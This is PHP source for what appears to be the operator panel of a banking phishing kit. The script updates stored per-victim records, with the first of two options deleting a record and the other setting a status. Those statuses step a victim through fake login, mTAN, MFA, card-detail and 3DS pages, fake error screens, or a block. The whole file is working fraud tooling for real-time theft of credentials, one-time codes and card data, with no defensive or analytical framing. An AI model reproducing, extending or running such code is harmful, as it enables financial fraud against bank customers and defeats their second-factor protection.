<?php
session_start();
if (!isset($_SESSION['panel_loggedin']) || $_SESSION['panel_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['id'], $_GET['decision'])) {
    $victimId = basename($_GET['id']);
    $decision = $_GET['decision'];
    $filePath = '../victims_data/' . $victimId . '.json';

    if (file_exists($filePath)) {
        if ($decision === 'delete') {
            unlink($filePath);
        } else {
            $data = json_decode(file_get_contents($filePath), true);
            if (is_array($data)) {
                $data['decision'] = $decision;
                $data['last_update'] = time();
                
                switch ($decision) {
                    case 'go_to_login': $data['status'] = 'Go to Login'; break;
                    case 'go_to_mtan': $data['status'] = 'Go to mTAN'; break;
                    case 'go_to_mfa': $data['status'] = 'Go to MFA'; break;
                    case 'go_to_cc': $data['status'] = 'Go to Card Details'; break;
                    case 'go_to_3ds': $data['status'] = 'Go to 3DS Verify'; break;
                    case 'show_full_login_error': $data['status'] = 'Login Error'; break;
                    case 'show_mtan_error': $data['status'] = 'mTAN Error'; break;
                    case 'show_mfa_error': $data['status'] = 'MFA Error'; break;
                    case 'show_cc_error': $data['status'] = 'Card Error'; break;
                    case 'show_3ds_error': $data['status'] = '3DS Error'; break;
                    case 'finish': $data['status'] = 'Success / Redirect'; break;
                    case 'block': $data['status'] = 'Blocked'; break;
                    default: $data['status'] = 'Decision: ' . $decision; break;
                }
                
                file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
            }
        }
    }
}
header('Location: dashboard.php');
exit;
?>